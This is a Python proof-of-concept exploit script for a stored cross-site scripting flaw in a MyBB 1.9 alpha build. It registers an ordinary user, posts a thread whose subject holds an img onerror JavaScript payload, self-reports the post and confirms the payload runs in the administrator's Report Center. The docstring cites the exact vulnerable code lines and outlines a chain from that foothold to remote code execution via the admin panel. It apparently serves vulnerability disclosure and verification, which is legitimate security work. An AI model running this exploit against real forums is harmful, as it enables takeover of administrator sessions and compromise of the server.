#!/usr/bin/env python3
"""
VULN-001 — Stored XSS in the Moderator Report Center via a thread subject.

Target  : MyBB 1.9.0-alpha.1 (dev-1.9, commit f8bf4e8)
Sink    : targets/mybb/modcp.php:471 ($report_data['thread_subject'] = raw subject)
          -> inc/themes/.../templates/modcp/reports/item.twig:11 ({{ trans(...) }})
          -> trans() is_safe=html (LangExtension.php:34) -> MyLanguage::sprintf()
             no-escape str_replace (inc/class_language.php:192)
Class   : CWE-79 Stored Cross-Site Scripting (privilege-crossing)

The flaw
--------
A thread subject is stored raw (PostDataHandler::verify_subject only trims and
length-checks — no HTML escaping, inc/datahandlers/post.php:180+). The front-end
Moderator Report Center renders a reported post's thread subject through the Twig
`trans()` helper, which is registered `is_safe=html` and therefore opts OUT of
Twig autoescaping; `trans()` -> MyLanguage::sprintf() substitutes the subject
with a plain str_replace and the language string places it as anchor LINK TEXT
(`in <a href="{1}">{2}</a>`). No htmlspecialchars_uni() is applied at the
controller (modcp.php:471) — unlike every sibling controller. So a subject such
as `<img src=x onerror=...>` reaches a moderator/administrator browser verbatim.

Exploitation idea
-----------------
Any registered user (open registration) creates a thread whose subject is the
payload, then self-reports its first post (self-reporting is allowed). When any
moderator/admin opens the Report Center (routine), the payload executes in their
authenticated session. Because the front-end shares an origin with /admin/, an
admin-session hit reaches the template eval() RCE (SECURITY.md #3689): a
low-privilege-user -> full-compromise chain.

What a successful run proves
---------------------------
(1) The attacker's raw payload is stored and served UN-escaped inside the Report
    Center page that a moderator/administrator actually sees (HTTP proof), and
(2) a real Chromium carrying the admin's session executes it (alert fires).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import mybb_common as m
import requests

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    print((f"\033[1;{_C[tag]}m[{tag}]\033[0m " if _USE_COLOR and tag in _C else f"[{tag}] ") + msg)


HERE = os.path.dirname(os.path.abspath(__file__))
BASE = m.BASE_URL
FID = int(os.environ.get("FID", "2"))                 # a normal forum (default seed forum)
REASON = int(os.environ.get("REASON", "3"))           # a reportreason rid with no required comment

MARKER = "xss" + m.secrets.token_hex(3)
# Fires onerror in the anchor-text context and leaves a secondary window marker.
PAYLOAD = f"<img src=x onerror=\"alert(document.domain);window.__xss='{MARKER}'\">"


def main():
    print("=" * 72)
    print("VULN-001: Stored XSS in ModCP Report Center via thread subject")
    print(f"Target: {BASE}")
    print("=" * 72)
    log("INFO", "exercising modcp.php:471 -> modcp/reports/item.twig:11 trans() is_safe=html sink")

    # --- precondition: any registered user (open registration) ------------- #
    attacker = m.rand("attacker_")
    pw = "Apass!" + m.secrets.token_hex(3)
    log("SETUP", f"creating an ordinary user {attacker} (any member can do this; no mod rights)")
    a_uid = m.create_user(attacker, pw)
    ac = m.new_session()
    if not m.login(ac, attacker, pw):
        log("FAIL", "attacker login failed")
        return 1
    log("INFO", f"attacker uid={a_uid} logged in")

    # --- step 1: create a thread whose SUBJECT carries the payload --------- #
    pk = m.post_key(ac, f"/newthread.php?fid={FID}")
    log("STEP", f"posting a thread in fid={FID} with subject = {PAYLOAD!r}")
    log("INFO", "the subject is the attacker-controlled sink; verify_subject() does NOT HTML-escape it")
    r = ac.post("/newthread.php", data={
        "action": "do_newthread", "fid": str(FID),
        "subject": PAYLOAD,
        "message": f"stored-xss proof {MARKER} — benign body",
        "my_post_key": pk, "submit": "Submit New Thread",
    }, allow_redirects=False)
    loc = r.headers.get("Location", "")
    tid = None
    mm = m.re.search(r"tid=(\d+)", loc) or m.re.search(r"tid=(\d+)", r.text)
    if mm:
        tid = int(mm.group(1))
    if not tid:
        # fall back to DB lookup by author
        rows = m.db_rows(f"SELECT tid FROM mybb_threads WHERE uid={a_uid} ORDER BY tid DESC LIMIT 1;")
        tid = int(rows[0][0]) if rows else None
    if not tid:
        log("FAIL", f"thread not created (redirect was {loc!r})")
        return 1
    # first-post pid for this thread
    pid = int(m.db_rows(f"SELECT firstpost FROM mybb_threads WHERE tid={tid};")[0][0])
    stored_subject = m.db_rows(f"SELECT subject FROM mybb_threads WHERE tid={tid};")[0][0]
    log("INFO", f"thread tid={tid}, first pid={pid}; subject stored in DB = {stored_subject!r}")
    if PAYLOAD not in stored_subject:
        log("FAIL", "subject was altered/stripped on storage — payload did not persist verbatim")
        return 1
    log("PROOF", "payload persisted verbatim in mybb_threads.subject (stored, not sanitised)")

    # --- step 2: self-report the first post so it lands in the Report Center #
    log("STEP", f"self-reporting post pid={pid} (report.php allows self-reports) so it enters the queue")
    r2 = ac.post("/report.php", data={
        "action": "do_report", "type": "post", "pid": str(pid),
        "reason": str(REASON), "my_post_key": pk,
    })
    nrep = m.db_rows(f"SELECT COUNT(*) FROM mybb_reportedcontent WHERE id={pid} AND type='post';")[0][0]
    log("INFO", f"reportedcontent rows for pid {pid}: {nrep}")
    if nrep == "0":
        log("FAIL", "report was not created; cannot reach the report center sink")
        return 1

    # --- step 3 (HTTP proof): moderator/admin opens the Report Center ------ #
    log("STEP", "logging in as the administrator (uid 1, super admin) — the victim")
    adm = m.admin_session()
    log("STEP", "admin opens modcp.php?action=reports (a routine moderation action)")
    rr = adm.get("/modcp.php?action=reports")
    body = rr.text
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# (1) store  POST /newthread.php  subject=<img src=x onerror=...>\n"
                "# (2) report POST /report.php      action=do_report&type=post&pid=%d&reason=%d\n"
                "# (3) fire   GET  /modcp.php?action=reports  (as a moderator/admin)\n\n"
                "GET /modcp.php?action=reports HTTP/1.1\n"
                "Host: %s\nCookie: mybbuser=<ADMIN uid_loginkey>\n\n" % (pid, REASON, BASE.split('://')[1]))
    idx = body.find(MARKER)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {rr.status_code}\n\n... region around the stored payload in the admin's Report Center ...\n\n")
        f.write(body[max(0, idx - 220):idx + 220] if idx >= 0 else body[:400])
    raw_present = PAYLOAD in body
    escaped = PAYLOAD.replace("<", "&lt;").replace(">", "&gt;") in body
    log("INFO", f"admin Report Center HTTP {rr.status_code}; raw payload present={raw_present}; escaped={escaped}")
    ok_http = raw_present and not escaped
    if ok_http:
        log("PROOF", "the stored subject is rendered UNescaped inside the admin's report list "
                     "(modcp/reports/item.twig:11 trans() is_safe=html) — attacker markup reaches the staff DOM")

    # --- step 4 (browser proof): the payload executes in the admin session - #
    log("STEP", "opening modcp.php?action=reports in real Chromium with the ADMIN cookie")
    fired, transcript = m.browser_dialog_check(
        f"{BASE}/modcp.php?action=reports", mybbuser=adm.cookies["mybbuser"],
        screenshot_rel="exploits/VULN-001/evidence/xss_fired.png", marker=MARKER)
    print("    " + transcript.strip().replace("\n", "\n    "))
    if fired:
        log("PROOF", "Chromium executed the stored payload in the ADMIN's session — alert() fired "
                     "(screenshot evidence/xss_fired.png). This is the user->admin->ACP->RCE entry point.")

    print("-" * 72)
    if ok_http and fired:
        log("OK", "exploit confirmed — stored subject executes JS in the administrator's Report Center")
        print("==> VULN-001: CONFIRMED — stored XSS fires in admin ModCP (user->admin->RCE chain)")
        return 0
    if ok_http:
        log("OK", "exploit confirmed — stored payload served unescaped into the admin Report Center sink")
        print("==> VULN-001: CONFIRMED — stored XSS lands in executable HTML in admin ModCP")
        return 0
    log("FAIL", "stored subject was not served unescaped to the moderator — sink may be patched")
    print("==> VULN-001: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
